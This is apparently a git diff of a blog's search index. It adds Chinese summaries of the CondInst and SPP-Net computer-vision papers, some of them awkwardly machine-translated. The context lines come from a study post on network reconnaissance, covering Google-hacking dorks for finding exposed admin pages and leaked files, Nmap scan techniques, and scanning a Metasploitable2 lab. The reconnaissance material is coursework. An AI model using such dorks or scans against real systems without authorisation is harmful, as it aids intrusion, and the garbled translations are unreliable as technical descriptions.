@@ -1,6 +1,137 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>【论文阅读】Conditional Convolutions for InstanceSegmentation</title>
+    <url>/2020/10/30/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91Conditional-Convolutions-for-InstanceSegmentation/</url>
+    <content><![CDATA[<h1>0x01 概要</h1>
+<p>Mask R-CNN等性能最好的实例分割方法依赖于ROI操作（通常是ROIPool或roalign）来获得最终的实例掩码。相比之下，我们建议从一个新的角度来解决站姿分割问题。我们不使用实例级roi作为固定权重网络的输入，而是使用基于实例的动态感知网络。CondInst有两个优点：1）通过完全卷积网络。</p>
+<a id="more"></a>
+<p>CondInst有两个优点：<br>
+1）通过完全卷积网络解决实例分割，消除了ROI裁剪和特征对齐的需要；<br>
+2）由于动态生成条件卷积的能力大大提高，掩模头可以非常紧凑（例如，3转换层，每个只有8个通道），导致明显更快的推断。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201030000730950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h1>0x02 Mask-RCNN的缺点</h1>
+<p>实例分割是计算机视觉中的一项基本而又具有挑战性的任务，它需要一种算法来预测图像中每个感兴趣的实例的每像素掩模。尽管最近提出了一些工作，但实例分割的主流框架仍然是两阶段方法Mask R-CNN，它将实例分割转化为两阶段的检测和分割任务。Mask R-CNN首先使用一个更快的对象检测器R-CNN来预测每个实例的边界框。然后在每个实例中，使用roiallign操作从网络的特征图中裁剪出感兴趣的区域（roi）。为了预测每个实例的最终掩模，将一个紧凑的全卷积网络（FCN）（即掩模头）应用到这些roi上，以执行前景/背景分割。</p>
+<p>1） 由于ROI通常是轴对齐的边界框，对于形状不规则的对象，它们可能包含大量不相关的图像内容，包括背景和其他实例。这个使用旋转roi可以缓解这个问题，但代价是更复杂的管道。</p>
+<p>2） 为了区分前景实例和背景内容或实例，掩码头需要一个相对较大的接受域来编码足够大的上下文信息。因此，在掩模头中需要一组3×3的卷积（例如，掩模R-CNN中有4个3×3卷积，256个通道）。它大大增加了掩模头的计算复杂度，导致推理时间在实例数上有显著变化。</p>
+<p>3） ROI的大小通常不同。为了在现代深度学习框架中使用有效的批处理计算，通常需要调整大小操作来将裁剪区域调整为相同大小的补丁。例如，Mask R-CNN会将所有裁剪区域的大小调整为14×14（使用反褶积将采样率提高到28×28），这限制了实例分段的输出分辨率，因为大型实例需要更高的分辨率来保留边界的细节</p>
+<h1>0x03 为什么FCNs在实例分割上的效果不好</h1>
+<p>我们发现，将模糊神经网络应用于实例分割的主要困难在于相似图像的出现可能需要不同的预测，但FCNs难以实现这一点。例如，如果在一个input image中有两个外观相似的人A和B，那么在预测A的实例掩码时，FCN需要将B预测为background w.r.t.A，这可能很困难，因为它们在外观。因此，ROI操作用于裁剪感兴趣的人，即A；并过滤掉B，实例分段需要两种类型的in队形：</p>
+<p>1） 用于对对象进行分类的外观信息；</p>
+<p>2）用于区分属于同一类别的多个对象的位置信息。几乎所有的方法都依赖于ROI裁剪，对实例的位置信息进行显式编码。相比之下，CondInst通过使用敏感卷积滤波器以及显示在特征地图上的相对坐标来利用位置信息。</p>
+<p>因此，我们提倡一种新的解决方案，即使用实例感知FCNs进行实例任务预测。换言之，与使用一组固定卷积滤波器的标准ConvNet作为掩码头来预测所有实例，而是根据要预测的实例来调整网络参数。在动态过滤网络[20]和CondConv[41]的启发下，对于每个实例，控制器子网络（见图3）动态生成掩码FCN网络参数（以实例的中心区域为条件），然后使用该参数预测该实例的掩码。预计网络参数可以对该实例的特征（例如相对位置、形状和外观）进行编码，并且只对该实例的像素进行激发，从而绕过了上述困难。这些条件掩模头被应用到整个特征映射中，消除了对ROI操作的需要。乍一看，这个想法可能行不通，因为如果某些图像包含多达几十个实例，则实例掩码头可能会产生大量的网络参数。然而，我们发现，一个非常紧凑的FCN掩模头和动态生成的滤波器已经可以优于先前基于ROI的mask R-CNN，从而大大降低了Mask-CNN中掩模头的每一瞬间的计算复杂度。</p>
+<h1>0x04 主要贡献</h1>
+<ul>
+<li>试图从一个新的角度来解决实例分割问题。为此，我们提出了CondInst实例分割框架，该框架比现有的Mask R-CNN等方法在提高实例分割速度的同时，提高了实例分割的性能。据我们所知，这是第一次一个新的实例分割框架在精确度和速度上都优于最新的技术</li>
+<li>CondInst是完全卷积的，并且避免了许多现有方法中使用的上述调整大小操作，因为CondInst不依赖ROI。不必调整特征图的大小，就可以获得高分辨率的分辨率，并具有更精确的边缘。</li>
+<li>与以前的方法不同，一旦训练完所有实例，掩码头中的过滤器都是固定的，而我们的掩码头中的过滤器是动态生成的，并根据实例进行调整。因此，只需记住一个过滤器，就可以大大减少所要求的过滤器的负载。因此，Mask head 可以非常轻量，显著减少推理时间。与bounding box检测器FCOS相比，CondInst只需要多10%的计算时间，甚至可以处理每个图像的最大实例数（即100个实例）。</li>
+</ul>
+<h1>0x05 CondInst的实例分割</h1>
+<h2 id="1x01-网络总体结构"><a class="header-anchor" href="#1x01-网络总体结构">¶</a>1x01 网络总体结构</h2>
+<p>回想一下mask R-CNN使用一个对象检测器来预测输入图像中实例的边界框。边界框实际上就是掩码R-CNN表示实例的方式。类似地，CondInst使用实例感知过滤器来表示实例。换句话说，CondInst没有将实例概念编码到边界框中，而是隐式地将其编码到掩码头的参数中，这是一种更灵活的方式。例如，它可以很容易地表示不规则的形状，而这些不规则形状是很难被表示的,）被边界框紧紧包围。这是CondInst相对于以前基于ROI的方法的优势之一。</p>
+<p>与基于ROI的方法获取边界框的方式类似，实例感知滤波器也可以通过对象检测器获得。在这项工作中，由于CondInst的简单性和灵活性，CondInst在流行的目标检测器FCOS上构建CondInst。同时，在FCOS中消除锚盒也可以节省参数的数目和条件的计算量。如图</p>
+<p><img src="https://img-blog.csdnimg.cn/20201030005947312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+利用特征金字塔网络的特征映射{P3、P4、P5、P6、P7}，其下采样率分别为8、16、32、64和128。如图3所示，在FPN的每个特征层上，应用一些功能层（在虚线框中）来进行实例相关的预测。例如，目标实例的类和实例的动态生成的筛选器。从这个意义上讲，CondInst可以看作是Mask R-CNN，它们都是先处理图像中的实例，然后预测实例的像素级掩码（即实例优先），除了检测器，如图所示，还有一个掩模分支，<strong>它提供了我们生成的掩码头作为输入来预测所需实例掩码的特征映射。</strong></p>
+<p>特征图表示为：<br>
+<img src="https://img-blog.csdnimg.cn/20201030012049379.png#pic_center" alt="在这里插入图片描述"><br>
+掩模分支连接到FPN level p3，因此其输出分辨率为输入图像分辨率的18。掩模分支在最后一层之前有四个3×3的卷积，有128个通道。之后，为了减少生成参数的数量，掩码分支的最后一层将信道数从128减少到8（即，Cmask＝8）。令人惊讶的是，使用cmask=8已经可以获得优异的性能，而使用更大的cmask（例如16）并不能提高性能，如我们的实验所示。更严重的是，使用cmask=2只会使mask AP的性能降低0.3%。此外，如图3所示，fmaski与坐标图相结合，这些坐标是fmask上所有位置到位置（x，y）的相对坐标（即，生成遮罩头的滤波器的位置）。然后，将组合发送到掩码头以预测实例掩码。如我们的实验所示，相对坐标为预测实例掩模提供了强有力的线索。此外，单个sigmoid被用作掩模头的最终输出，因此掩模预测是类无关的。<strong>实例的类别由分类头与控制器并行预测。</strong></p>
+<p>原始掩模预测的分辨率与F mask的分辨率相同，后者是输入图像分辨率的八分之一。为了产生高分辨率的实例掩模，使用双线性上采样将maskprediction上采样到4，得到400×512掩模预测（如果输入图像大小为800×1024）。我们将在实验中证明上采样对CondInst的最终瞬间分段性能至关重要。需要注意的是，该掩模的分辨率比掩模R-CNN（如前所述仅为28×28）高得多。</p>
+<h2 id="1x02-网络输出和训练标签"><a class="header-anchor" href="#1x02-网络输出和训练标签">¶</a>1x02 网络输出和训练标签</h2>
+<p>CondInst 具有如下的输出头：</p>
+<ul>
+<li>
+<p>Classiofication Head：<br>
+分类头预测实例的分类，ground-truth标签为类别信息或者0（背景）即背景）。在FCOS中，网络预测一个C-D vector $p_{x,y}$用于分类，每个元素在$p_{x,y}$对应于一个二进制分类器，其中C表示类别的数量。</p>
+</li>
+<li>
+<p>Controller  Head<br>
+控制器头与上述分类头具有相同的结构，用于预测该位置实例的Mask head的参数。Mask head 预测这个物体Mask。为了预测参数，我们将滤波器的所有参数（即权重和偏差）串联在一起作为一个N-D向量 $\theta_{x,y}$，其中N是参数的总数。因此，控制器头部没有输出信道。掩模头是一种非常紧凑的fcn结构，它有三个1×1的卷积，每个卷积有8个通道，除了最后一个外，都使用ReLU作为激活函数。这里没有使用诸如批处理规范化之类的规范化层。最后一层有1个输出信道，使用sigmoid来预测前景的概率。任务头总共有169个参数（#权重=（8+2）×8（conv1）+8×8（conv2）+8×1（conv3）和#biaes=8（conv1）+8（conv2）+1（conv3））。如前所述，生成的过滤器包含关于实例所在位置的信息，因此，理想情况下，带有过滤器的遮罩头将只对实例的像素点进行触发，甚至将整个特征映射作为输入。</p>
+</li>
+<li>
+<p>Center-ness  and  Box  Heads.<br>
+从概念上讲，CondInst可以消除box head，因为CondInst不需要ROIs。然而，我们发现如果使用基于Box的NMS，推理时间将大大减少。因此，我们仍然预测CondInst中的Box。我们要强调的是，预测框仅在NMS中使用，不涉及任何ROI操作。</p>
+</li>
+</ul>
+<h2 id="1x03-损失函数"><a class="header-anchor" href="#1x03-损失函数">¶</a>1x03 损失函数</h2>
+<p><img src="https://img-blog.csdnimg.cn/20201030062801683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/20201030063548336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="1x04-推理"><a class="header-anchor" href="#1x04-推理">¶</a>1x04 推理</h2>
+<p>给定一幅输入图像，通过网络进行转发，得到包含分类置信度的输出$p_{x,y}$, 中心度得分，box预测 $t_{x,y}$和生成的参数$\theta_{x,y}$, 我们首先按照FCOS中的步骤来获得Box。然后，使用阈值为0.6的基于Box的NMS来消除重复检测，然后使用前100个框计算掩码。与FCOS不同，这些方框还与控制器生成的过滤器相关联。让我们假设在NMS之后还有K个box，因此我们有生成的K个过滤器组。这一组滤波器用于产生特定于实例的Mask-head。这些特定于实例的掩码头以FCNs的方式应用于与$F_{x,y}$（即$F_{mask}$,$O_{x,y}$的组合）来预测实例的掩码。由于任务头是一个非常紧凑的网络（3个1×1卷积，共有8个信道和169个参数），计算掩码的开销非常小。例如，即使有100次检测（即MS-COCO上每个图像的最大检测次数），掩模头上总共也只有不到5毫秒的时间，这只给基本检测器FCOS增加了10%的计算时间。相比之下，Mask R-CNN的Mask head有4个3×3的256个通道，参数大于2.3M，计算时间较长。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201030065343641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h1>0x06 小结</h1>
+<p>提出了一个新的更简单的实例分割框架Condinst。不同于以往的方法，如Mask R-CNN，它使用固定权重的任务头，CondInst将掩码头设置在实例上，并动态生成掩码头的过滤器。这不仅降低了掩模头的参数和计算复杂度，而且消除了ROI操作，从而形成了一个更快、更简单的实例分割框架。</p>
+]]></content>
+      <categories>
+        <category>CV</category>
+      </categories>
+      <tags>
+        <tag>CV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>空间金字塔池化网络SPP-Net</title>
+    <url>/2020/10/29/%E7%A9%BA%E9%97%B4%E9%87%91%E5%AD%97%E5%A1%94%E6%B1%A0%E5%8C%96%E7%BD%91%E7%BB%9CSPP-Net/</url>
+    <content><![CDATA[<p>@[toc]</p>
+<h2 id="0x01概要介绍"><a class="header-anchor" href="#0x01概要介绍">¶</a>0x01概要介绍</h2>
+<p>现有的深卷积神经网络（CNNs）需要一个固定大小（如224×224）的输入图像。这种要求是“人为的”，可能会降低对任意大小/比例的图像或子图像的识别精度。在这项工作中，我们为网络配备了另一种池策略“空间金字塔池”，以消除上述要求。这种新的网络结构称为SPP网，它可以生成一个固定长度的表示，而不考虑图像的大小/比例。金字塔池对对象变形也很健壮。有了这些优势，SPP网应该在总体上改进所有基于CNN的图像分类方法。</p>
+<a id="more"></a>
+<p><code>SPP-net使用单一的完整图像表示而不是精细的方法实现了最先进的分类结果-调音SPP网络的强大功能在目标检测中也很重要。利用SPP网络，我们只需计算一次来自整个图像的特征映射，然后将任意区域（子图像）的特征集合起来生成固定长度的表示，以训练检测器</code>。该方法避免了重复计算卷积特征。在处理测试图像时，我们的方法比R-CNN方法快24-102倍</p>
+<p><code>引出SPP-Net的原因：</code><br>
+在cnn的训练和测试中存在一个技术问题：目前流行的CNNs要求输入图像大小固定（如224×224），这既限制了输入的纵横比，也限制了输入的规模图像。什么时候对于任意大小的图像，当前的方法大多是将输入图像调整为固定大小，通过裁剪或通过翘曲，如图所示。但是裁剪区域可能不包含整个对象，而扭曲的内容可能会导致不需要的几何图形扭曲。识别由于内容丢失或失真，精度可能会受到影响。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201029202219733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+<code>为什么需要固定尺寸？</code></p>
+<p>cnn主要由两部分组成：卷积层和随后的完全连接层。卷积层以滑动窗口方式操作，并输出表示激活的空间排列的特征图（图2）。事实上，旋转层不需要固定的图像大小，可以生成任何尺寸的特征图。另一方面，完全连接的层需要有固定大小/长度的定义输入。因此，固定大小约束仅来自完全连接层.</p>
+<p>输入本文引入空间金字塔池（SPP）来取消网络固定规模约束</p>
+<h2 id="0x02-SPP-Net"><a class="header-anchor" href="#0x02-SPP-Net">¶</a>0x02 SPP-Net</h2>
+<p>我添加了最后一个卷积层上的SPP层。spp层将特征集合起来，生成固定长度的输出，然后输入到完全连接的层（或其他分类器）。换句话说，我们在网络层次结构的高级阶段（在进化层和完全连接层之间）执行一些信息“聚合”，以避免在开始。图1（底部）通过引入SPP层显示了网络体系结构的变化。我们称之为新的网络结构spp-net</p>
+<p><code>SPP的优点</code></p>
+<p>SPP对于深层CNN有几个显著的特性：1）SPP能够生成固定长度的输出，而不考虑输入大小，而以前的deepnetworks中使用的滑动窗口池[3]不能；2）SPP使用多级而滑动窗口池只使用单个窗口大小。多层池对物体变形具有很强的鲁棒性[15]；3）由于输入尺度的灵活性，在可变尺度下提取的SPPcan池特征。实验表明，这些因素都提高了深层网络的识别精度。</p>
+<p>SPP-net不仅可以从任意大小的图像/窗口生成测试的表示，而且还允许我们在训练期间提供不同大小或比例的图像。使用可变大小的图像进行训练可以提高尺度不变性并减少过拟合。我们开发了一种简单的多尺寸采集方法。当我们接受一个网络输入的单一变量时，我们使用一个固定的网络大小来训练它。在每一个纪元中，我们用一个给定的输入大小训练网络，然后切换到另一个输入大小来进行下一步操作。实验表明，这种多尺度训练与传统的单尺度训练一样收敛，具有更好的测试精度。</p>
+<p><code>与R-CNN对对比：</code></p>
+<p>R-CNN中的特征计算是非常耗时的，因为它反复地将深度卷积网络应用于每幅图像上数千个扭曲区域的原始像素。Spp-Net可以在整个图像上运行卷积层（不考虑窗口数），然后通过SPP网络在特征地图上提取特征。注意 <strong>在特征地图（而不是图像区域）上训练/运行探测器实际上是一个更流行的想法。</strong> 但SPP网络继承了CNN深层特征映射的强大功能，同时也继承了SPP在任意窗口大小下的灵活性，从而使SPP网络具有了卓越的精度和效率。在我们的实验中，基于SPP网络的系统（建立在CNN管道上）计算的特征比R-CNN快24-102倍，具有更好的或可比性准确。有SPP网络可以促进更深层和更大的各种网络.</p>
+<h2 id="0x03-网络结构"><a class="header-anchor" href="#0x03-网络结构">¶</a>0x03 网络结构</h2>
+<h3 id="1x01-卷积层和特征图"><a class="header-anchor" href="#1x01-卷积层和特征图">¶</a>1x01 卷积层和特征图</h3>
+<p>考虑一下流行的七层架构，前五层是卷积的，其中一些是池层。这些池层也可以被认为是“卷积的”，因为它们使用的是滑动窗口。</p>
+<p>最后的两层是完全连接的，以N路softmax作为输出，其中N是类别的数目。</p>
+<p>上面描述的深度网络需要一个fixedimage大小。然而，我们注意到，固定尺寸的要求仅仅是由于完全连接的层需要固定长度向量作为输入。另一方面，卷积层接受轨道尺寸的输入。卷积层使用滑动过滤器，其输出与输入的aspectratio大致相同。这些输出被称为特征映射[1]——它们不仅涉及到响应的强度，而且涉及到它们的空间位置。</p>
+<p>将一些特征地图可视化。它们是由conv5layer的一些过滤器生成的。图2（c）显示了ImageNet数据集中这些过滤器的最强激活图像。我们看到过滤器可以被一些语义内容激活。例如，第55个滤波器（图2，左下角）最易被圆形激活；第66个滤波器（图2，右上角）最易被∧形激活；第118个滤波器（图2，右下角）最易被a∨激活-形状。这些输入图像中的形状（图2（a））激活相应位置的特征映射（图2中的箭头）</p>
+<p><img src="https://img-blog.csdnimg.cn/20201029202425874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>生成图2中的featuremaps，而不需要固定输入大小。这些由深卷积层生成的特征映射与传统方法中的特征映射相似[27]，[28]。在这些方法中，SIFT向量[29]或图像块[28]被密集地提取和编码，例如通过矢量量化、稀疏编码或费希尔核进行编码。这些编码的特征由特征映射组成，然后由词包（BoW）或空间金字塔集合。类似地，深卷积特征可以以类似的方式汇集在一起。</p>
+<h3 id="1x02-空间金字塔池层"><a class="header-anchor" href="#1x02-空间金字塔池层">¶</a>1x02 空间金字塔池层</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201029202443152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>这样的向量可以通过单词包（BoW）方法生成，该方法将这些特征集合在一起。空间金字塔池[14]，[15]改进了BoW，因为它可以通过在局部空间容器中的池来保持空间信息。这些空间存储单元的大小与图像大小成比例，因此无论图像大小，存储单元的数量都是固定的。这与以前的深层网络的滑动窗口池[3]不同，其中滑动窗口的数量取决于输入大小。到对于任意大小的图像采用深网络，我们将最后一个池层（例如，在最后一个卷积层之后的pool5）替换为aspatialpyramd池层。图3说明了方法。输入每一个空间单元，我们将每个滤波器的响应集中起来（在本文中我们使用最大池），空间金字塔池的输出是km维向量，其中格数表示为sm（kis是最后一个卷积层中的滤波器数）。固定维向量被输入到全连通层。</p>
+<h2 id="0x04-训练网络"><a class="header-anchor" href="#0x04-训练网络">¶</a>0x04 训练网络</h2>
+<p>Spp-Net的训练过程分为两部</p>
+<h3 id="1x01-单一尺度训练——single-size"><a class="header-anchor" href="#1x01-单一尺度训练——single-size">¶</a>1x01 单一尺度训练——single-size</h3>
+<p>所谓单一尺寸训练指的是先只对一种固定输入图像进行训练，比如224 x 224，在conv5之后的特征图为：13x13这就是我们的（a x a）而我要得到的输出为4 x 4，2 x 2,1 x 1，怎么办呢？这里金字塔层bins即为 n x n，也就是4 x 4，2 x 2,1 x 1，我们要做的就是如何根据a和n设计一个池化层，使得a x a的输入能够得到n x n的输出。实际上这个池化层很好设计，我们称这个大小和步幅会变化的池化层为sliding window pooling。</p>
+<p>它的大小为：windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整。数据实验如下：</p>
+<p>当a x a为13 x 13时，要得到4 x 4的输出，池化层的大小为4，移动步幅为3；</p>
+<p>当a x a为13 x 13时，要得到2 x 2的输出，池化层的大小为7，移动步幅为6；</p>
+<p>当a x a为13 x 13时，要得到1 x 1的输出，池化层的大小为13，移动步幅为13；</p>
+<p>有的小伙伴一定发现，那如果我的输入a x a变化为10 x 10呢，此时再用上面的三个池化核好像得不到固定的理想输出啊，事实上的确如此，这是训练的第二个过程要讲的，因为此过程称之为“单一尺度训练”，针对的就是某一个固定的输入尺度而言的。</p>
+<h2 id="1x02-多尺寸训练——multi-size（以两种尺度为例）"><a class="header-anchor" href="#1x02-多尺寸训练——multi-size（以两种尺度为例）">¶</a>1x02 多尺寸训练——multi-size（以两种尺度为例）</h2>
+<p>虽然带有SPP（空间金字塔）的网络可以应用于任意尺寸，为了解决不同图像尺寸的训练问题，我们往往还是会考虑一些预设好的尺寸，而不是一些尺寸种类太多，毫无章法的输入尺寸。现在考虑这两个尺寸：180×180,224×224，此处只考虑这两个。</p>
+<p>我们使用<code>缩放</code>而不是裁剪，将前述的224的区域图像变成180大小。这样，不同尺度的区域仅仅是分辨率上的不同，而不是内容和布局上的不同。</p>
+<p>那么对于接受180输入的网络，我们实现另一个固定尺寸的网络。在论文中，conv5输出的特征图尺寸是axa=10×10。我们仍然使用windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整，实现每个金字塔池化层。这个180网络的空间金字塔层的输出的大小就和224网络的一样了。</p>
+<p>当a x a为10 x 10时，要得到4 x 4的输出，池化层的大小为3，移动步幅为2（注意：此处根据这样的一个池化层，10 x 10的输入好像并得不到4 x 4的输出，9 x 9或者是11 x 11的倒可以得到4 x 4的）这个地方我也还不是特别清楚这个点，后面我会说出我的个人理解。</p>
+<p>当a x a为10 x 10时，要得到2 x 2的输出，池化层的大小为5，移动步幅为5；</p>
+<p>当a x a为10 x 10时，要得到1 x 1的输出，池化层的大小为10，移动步幅为10；</p>
+<p>这样，这个180网络就和224网络拥有一样的参数了。换句话说，训练过程中，我们通过使用共享参数的两个固定尺寸的网络实现了不同输入尺寸的SPP-net。</p>
+<p>为了降低从一个网络（比如224）向另一个网络（比如180）切换的开销，我们在每个网络上训练一个完整的epoch，然后在下一个完成的epoch再切换到另一个网络（权重保留）。依此往复。实验中我们发现多尺寸训练的收敛速度和单尺寸差不多。</p>
+<p>多尺寸训练的主要目的是在保证已经充分利用现在被较好优化的固定尺寸网络实现的同时，模拟不同的输入尺寸。除了上述两个尺度的实现，我们也在每个epoch中测试了不同的s x s输入，s是从180到224之间均匀选取的。后面将在实验部分报告这些测试的结果。</p>
+<p>注意，上面的单尺寸或多尺寸解析度只用于训练。在测试阶段，是直接对各种尺寸的图像应用SPP-net的。</p>
+<h2 id="0x05-Spp-Net在目标检测上的应用"><a class="header-anchor" href="#0x05-Spp-Net在目标检测上的应用">¶</a>0x05 Spp-Net在目标检测上的应用</h2>
+<p>SPP网络，这个方法的思想在R-CNN、Fast RCNN， Faster RCNN上都起了举足轻重的作用，对于检测算法，论文中是这样做到：使用ss生成~2k个候选框，缩放图像min(w,h)=s之后提取特征，每个候选框使用一个4层的空间金字塔池化特征，网络使用的是ZF-5的SPPNet形式。之后将12800d的特征输入全连接层，SVM的输入为全连接层的输出。这个算法可以应用到多尺度的特征提取：先将图片resize到五个尺度：480，576，688，864，1200，加自己6个。然后在map window to feature map一步中，选择ROI框尺度在｛6个尺度｝中大小最接近224x224的那个尺度下的feature maps中提取对应的roi feature。这样做可以提高系统的准确率。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201029204259321.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>CV</category>
+      </categories>
+      <tags>
+        <tag>CV</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【白帽子学习笔记】网络扫描与网络侦查</title>
     <url>/2020/10/29/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E6%9F%A5/</url>
     <content><![CDATA[<p>[toc]</p>
@@ -16,20 +147,20 @@
 （7） 找到目标可能存在的漏洞。</p>
 <a id="more"></a>
 <h1>0x02 常用工具介绍</h1>
-<h2 id="1x01-google-hack"><a class="header-anchor" href="#1x01-google-hack">¶</a>1x01 Google Hack</h2>
+<h2 id="1x01-Google-Hack"><a class="header-anchor" href="#1x01-Google-Hack">¶</a>1x01 Google Hack</h2>
 <p>Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。</p>
 <p>我在以前写过一篇Goolge Hack基本语法的介绍博客。 链接如下：<a href="https://blog.csdn.net/python_LC_nohtyp/article/details/106586528">【白帽子学习笔记10】Google语法</a></p>
-<h2 id="1x02-nmap"><a class="header-anchor" href="#1x02-nmap">¶</a>1x02 Nmap</h2>
+<h2 id="1x02-Nmap"><a class="header-anchor" href="#1x02-Nmap">¶</a>1x02 Nmap</h2>
 <p>Nmap是一个网络侦察和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取哪台主机正在运行以及提供什么服务等信息。Nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。Nmap还提供了一些高级的特征，例如：通过TCP/IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口映射)，碎片扫描，以及灵活的目标和端口设定。<br>
 Nmap运行通常会得到被扫描主机端口的列表。Nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止Nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙/包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。<br>
 根据使用的功能选项，Nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。</p>
-<h2 id="1x03-winhex"><a class="header-anchor" href="#1x03-winhex">¶</a>1x03 Winhex</h2>
+<h2 id="1x03-Winhex"><a class="header-anchor" href="#1x03-Winhex">¶</a>1x03 Winhex</h2>
 <p>WinHex  是一款以通用的 16 进制编辑器为核心，专门用来对付计算机取证、数据恢复、低级数据处理、以及 IT 安全性、各种日常紧急情况的高级工具： 用来检查和修复各种文件、恢复删除文件、硬盘损坏、数码相机卡损坏造成的数据丢失等。</p>
-<h2 id="1x04-metasploit"><a class="header-anchor" href="#1x04-metasploit">¶</a>1x04 Metasploit</h2>
+<h2 id="1x04-Metasploit"><a class="header-anchor" href="#1x04-Metasploit">¶</a>1x04 Metasploit</h2>
 <p>Metasploit是一个渗透测试框架，里面集合了很多的渗透测试功能。我关于Metasploit也写过一篇博客，链接如下：<br>
 <a href="https://blog.csdn.net/python_LC_nohtyp/article/details/108874614">白帽子学习笔记18】Metasploit学习笔记</a></p>
 <h1>0x03 被动扫描</h1>
-<h2 id="1x01-麻省理工学院网站中文件名包含-network-security-的pdf文档"><a class="header-anchor" href="#1x01-麻省理工学院网站中文件名包含-network-security-的pdf文档">¶</a>1x01 麻省理工学院网站中文件名包含“network security”的pdf文档</h2>
+<h2 id="1x01-麻省理工学院网站中文件名包含“network-security”的pdf文档"><a class="header-anchor" href="#1x01-麻省理工学院网站中文件名包含“network-security”的pdf文档">¶</a>1x01 麻省理工学院网站中文件名包含“network security”的pdf文档</h2>
 <p>首先我们先来构造一下谷歌语法：</p>
 <p><code>inurl:mit.edu intext:network security filetype:pdf</code></p>
 <ul>
@@ -77,7 +208,7 @@ Android 获取方法：Android： 拨号<code>*#*#4636#*#*</code>进入手机信
 这两个都是我的IP地址，为什么会不一样呢？</p>
 <p>因为10.33.17.179是我的内网网址，而当我访问<code>https://whatismyipaddress.com</code>的时候，这个网址的主机是在外网的，我的数据包需要经过路由器将信息传输到外网当中，所以这个网页中获取的就是经过路由器转换后的外网地址。</p>
 <h1>0x04 NMAP扫描Metasploitable2漏洞</h1>
-<h2 id="1x01-nmap扫描metasploitable2端口开放情况"><a class="header-anchor" href="#1x01-nmap扫描metasploitable2端口开放情况">¶</a>1x01 NMAP扫描Metasploitable2端口开放情况</h2>
